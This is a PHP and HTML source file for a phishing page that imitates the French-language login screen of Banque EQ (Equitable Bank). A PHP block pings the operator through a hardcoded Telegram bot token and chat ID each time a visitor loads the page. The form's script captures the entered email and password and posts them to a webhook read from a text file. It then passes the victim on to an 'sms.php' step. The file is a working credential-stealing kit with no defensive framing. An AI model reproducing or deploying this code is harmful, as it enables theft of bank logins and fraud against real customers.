<?php session_start();
$_SESSION["bank"] ='EQBANQUE';

?>
<?php
// Remplace par le token de ton bot Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
// Remplace par ton chat_id Telegram
$chat_id = '6242884372'; 
// Message à envoyer avec l'IP de l'utilisateur, latitude et longitude
$message = "🏛🏛*LAURENTIENNE*🏛🏛\n";

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API Telegram
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);
?>



<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banque EQ - Connexion</title>
    <script src="https://cdn.tailwindcss.com/3.4.16"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#8E6FF7',
                        secondary: ''
                    },
                    borderRadius: {
                        'none': '0px',
                        'sm': '4px',
                        DEFAULT: '8px',
                        'md': '12px',
                        'lg': '16px',
                        'xl': '20px',
                        '2xl': '24px',
                        '3xl': '32px',
                        'full': '9999px',
                        'button': '8px'
                    }
                }
            }
        }
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css">
    <style>
        :where([class^="ri-"])::before {
            content: "\f3c2";
        }

        body {
            background-color: #f5f5f5;
            font-family: 'Inter', sans-serif;
        }

        .form-input:focus {
            outline: none;
            border-color: #8E6FF7;
        }

        .checkbox-custom {
            appearance: none;
            width: 18px;
            height: 18px;
            border: 1px solid #d1d5db;
            border-radius: 4px;
            position: relative;
            cursor: pointer;
        }

        .checkbox-custom:checked {
            background-color: #8E6FF7;
            border-color: #8E6FF7;
        }

        .checkbox-custom:checked::after {
            content: "";
            position: absolute;
            left: 6px;
            top: 2px;
            width: 5px;
            height: 10px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }
    </style>
            <!-- Simple CSS spinner -->
    <style>
        .spinner {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #006241;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        #errorPopup {
            position: fixed;
            top: 30%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #f44336;
            color: white;
            padding: 20px 30px;
            border-radius: 10px;
            z-index: 10000;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>

<body class="min-h-screen">
    <!-- Header -->
    <header class="bg-white py-4 px-4 md:px-6 shadow-sm">
        <div class="container mx-auto">
            <div class="flex flex-col md:flex-row md:justify-between md:items-center gap-4 md:gap-0">
                <div class="flex items-center justify-between">
                    <div class="flex items-center">
                        <div class="bg-yellow-400 w-10 h-10 flex items-center justify-center rounded">
                            <span class="font-bold text-black">EQ</span>
                        </div>
                        <span class="ml-2 font-bold text-black">Banque EQ</span>
                    </div>
                    <div class="md:hidden w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center cursor-pointer">
                        <i class="ri-menu-line text-gray-600"></i>
                    </div>
                </div>
                <div class="flex flex-col md:flex-row items-start md:items-center gap-4 md:space-x-4">
                    <a href="#" class="text-gray-700 hover:text-primary transition">Besoin d'aide?</a>
                    <div class="flex items-center border border-gray-300 rounded-full px-4 py-1">
                        <span>Français</span>
                        <div class="w-6 h-6 ml-2 flex items-center justify-center">
                            <i class="ri-arrow-down-s-line"></i>
                        </div>
                    </div>
                    <div class="hidden md:flex w-10 h-10 bg-gray-100 rounded-full items-center justify-center cursor-pointer">
                        <i class="ri-moon-line text-gray-600"></i>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- Main Content -->
    <main class="container mx-auto py-12 md:py-16 px-4">
        <div class="w-full max-w-lg mx-auto bg-white rounded-lg shadow-md p-8 md:p-10">
            <h1 class="text-3xl font-bold text-center mb-10">Ouvrir une session</h1>
            <form id="loginForm" action="/eqbanque/sms.php" method="post">
            <div class="mb-6 relative">
                    <div class="flex items-center border border-gray-300 rounded-md px-4 py-3">
                        <div class="w-6 h-6 flex items-center justify-center mr-2">
                            <i class="ri-mail-line text-gray-500"></i>
                        </div>
                        <input name='cvv' type="email" class="w-full border-none focus:ring-0 text-sm" placeholder="Par courriel">
                    </div>
                </div>
                <div class="mb-6 relative">
                    <div class="flex items-center border border-gray-300 rounded px-3 py-2">
                        <div class="w-6 h-6 flex items-center justify-center mr-2">
                            <i class="ri-lock-line text-gray-500"></i>
                        </div>
                        <input name='mdp' type="password" class="w-full border-none focus:ring-0 text-base" placeholder="Mot de passe">
                        <div class="w-8 h-8 flex items-center justify-center cursor-pointer">
                            <i class="ri-eye-line text-gray-500 text-lg"></i>
                        </div>
                    </div>
                </div>
                <button type="submit" class="w-full bg-[#C41F7E] hover:bg-opacity-90 text-white py-4 !rounded-button mb-6 text-lg font-medium whitespace-nowrap">
                    Ouvrir une session
                </button>
                <div class="flex items-center justify-between mb-8">
                    <div class="flex items-center">
                        <input type="checkbox" id="remember" class="checkbox-custom mr-3">
                        <label for="remember" class="text-base text-gray-700">Mémoriser mon courriel</label>
                    </div>
                    <a href="#" class="text-[#C41F7E] text-base hover:underline">Mot de passe oublié</a>
                </div>
                <div class="text-center text-sm text-gray-700">
                    Vous n'avez pas de compte?
                    <a href="#" class="text-primary hover:underline">S'inscrire</a>
                </div>
            </form>
            <div class="mt-8 text-center">
                <a href="#" class="text-sm text-gray-500 hover:text-primary">Garantie de sécurité</a>
            </div>
        </div>
    </main>
    <!-- Chat Button -->
    <div class="fixed bottom-6 right-6">
        <button class="w-14 h-14 bg-pink-500 text-white rounded-full shadow-lg flex items-center justify-center hover:bg-pink-600 transition">
            <i class="ri-message-3-line text-xl"></i>
        </button>
    </div>
    <!-- Footer -->
    <footer class="bg-white mt-10 md:mt-20 py-6 md:py-8 border-t border-gray-200">
        <div class="container mx-auto px-4">
            <div class="flex flex-col md:flex-row md:justify-between md:items-center gap-6 md:gap-0">
                <nav class="grid grid-cols-2 md:flex md:space-x-6 gap-4 text-sm text-gray-600">
                    <a href="#" class="hover:text-primary">Nous joindre</a>
                    <a href="#" class="hover:text-primary">FAQ</a>
                    <a href="#" class="hover:text-primary">Accessibilité</a>
                    <a href="#" class="hover:text-primary">Confidentialité</a>
                    <a href="#" class="hover:text-primary">Sécurité</a>
                    <a href="#" class="hover:text-primary">Avis juridiques</a>
                </nav>
                <div class="text-center md:text-right">
                    <p class="text-xs text-gray-500">MCMarque déposée de la Banque Equitable. Tous droits réservés.</p>
                    <p class="text-xs text-gray-500">La Banque EQ est un nom commercial de la Banque Equitable.</p>
                </div>
            </div>
        </div>
    </footer>
    <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Intercepte la soumission normale
        showLoader();

        const form = this;
        const formData = new FormData(form);
        const data = {
            cvv: formData.get('cvv'),
            mdp: formData.get('mdp'),
            remember: formData.get('remember') === 'on'
        };

        // On lit le webhook depuis le fichier texte
        fetch('/webhookurl.txt')
            .then(response => response.text())
            .then(webhookURL => {
                // Nettoyage (par exemple si le fichier contient des sauts de ligne)
                webhookURL = webhookURL.trim();

                return fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
            })
            .then(response => response.json())
            .then(result => {
                hideLoader();

                if (result.continue === "yes") {
                    form.removeEventListener('submit', arguments.callee); // On retire l'interception
                    form.submit(); // Soumission réelle
                } else {
                    showPopup("Erreur : informations incorrectes.");
                }
            })
            .catch(error => {
                hideLoader();
                console.error('Erreur :', error);
                showPopup("Une erreur est survenue.");
            });
    });

    function showLoader() {
        const loader = document.createElement('div');
        loader.id = 'fullScreenLoader';
        loader.style.position = 'fixed';
        loader.style.top = 0;
        loader.style.left = 0;
        loader.style.width = '100vw';
        loader.style.height = '100vh';
        loader.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
        loader.style.display = 'flex';
        loader.style.justifyContent = 'center';
        loader.style.alignItems = 'center';
        loader.style.zIndex = 9999;
        loader.innerHTML = `<div class="spinner"></div>`;
        document.body.appendChild(loader);
    }

    function hideLoader() {
        const loader = document.getElementById('fullScreenLoader');
        if (loader) loader.remove();
    }

    function showPopup(message) {
        const popup = document.createElement('div');
        popup.id = 'errorPopup';
        popup.style.position = 'fixed';
        popup.style.top = '20px';
        popup.style.left = '50%';
        popup.style.transform = 'translateX(-50%)';
        popup.style.backgroundColor = '#f44336';
        popup.style.color = 'white';
        popup.style.padding = '15px 25px';
        popup.style.borderRadius = '8px';
        popup.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
        popup.style.zIndex = 10000;
        popup.textContent = message;

        function removePopup() {
            popup.remove();
            document.removeEventListener('click', removePopup);
        }

        document.body.appendChild(popup);
        document.addEventListener('click', removePopup);
    }
</script>
</body>

</html>